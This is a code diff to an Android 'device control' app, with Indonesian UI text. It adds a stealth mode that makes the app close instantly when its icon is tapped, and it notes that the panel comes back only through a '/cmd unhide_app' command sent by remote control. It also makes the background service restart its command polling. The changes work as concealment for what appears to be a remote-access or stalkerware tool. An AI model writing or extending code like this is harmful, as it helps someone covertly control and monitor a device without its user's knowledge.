@@ -52,6 +52,11 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
 
         val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
+        if (prefs.getBoolean("stealth_mode", false)) {
+            finish()
+            return
+        }
+
         val dm    = resources.displayMetrics
 
         fun dp(v: Int) = (v * dm.density).toInt()
@@ -433,17 +438,26 @@ class MainActivity : AppCompatActivity() {
             setMargins(0, 0, 0, 0)
         }
         hideBtn.setOnClickListener {
-            Toast.makeText(this, "App icon will vanish now...", Toast.LENGTH_SHORT).show()
-            val pm = packageManager
-            pm.setComponentEnabledSetting(
-                android.content.ComponentName(this, "com.example.devicecontrol.LauncherAlias"),
-                2, 1
-            )
-            pm.setComponentEnabledSetting(
-                android.content.ComponentName(this, MainActivity::class.java),
-                2, 1
-            )
-            finishAffinity()
+            AlertDialog.Builder(this)
+                .setTitle("Aktifkan Kamuflase?")
+                .setMessage("Di Android 12-15, ikon aplikasi tidak dapat dihilangkan secara sempurna (Sistem akan otomatis merubahnya menjadi shortcut ke Pengaturan Aplikasi / App Info).\n\nSebagai gantinya, aplikasi ini akan dikamuflase. Saat ini, jika seseorang menekan ikon aplikasi, Control Panel tidak akan muncul dan aplikasi sekilas akan langsung tertutup sendiri.\n\nGunakan fitur /cmd unhide_app dari remote control Anda untuk memunculkan panel ini lagi.")
+                .setPositiveButton("Aktifkan") { _, _ ->
+                    val pm = packageManager
+                    val aliasName = android.content.ComponentName(this, "com.example.devicecontrol.LauncherAlias")
+                    
+                    // Pastikan Icon alias tidak didisable agar OS tidak men-trigger fallback App Info
+                    pm.setComponentEnabledSetting(
+                        aliasName,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP 
+                    )
+                    
+                    prefs.edit().putBoolean("stealth_mode", true).apply()
+                    Toast.makeText(this, "Kamuflase Aktif!", Toast.LENGTH_LONG).show()
+                    finishAffinity()
+                }
+                .setNegativeButton("Batal", null)
+                .show()
         }
         root.addView(hideBtn)
 
@@ -561,7 +575,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun checkAndStartService() {
-        val intent = Intent(this, ControlService::class.java)
+        val intent = Intent(this, ControlService::class.java).apply {
+            action = "RESTART_POLLING"
+        }
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(intent) else startService(intent)
     }
 
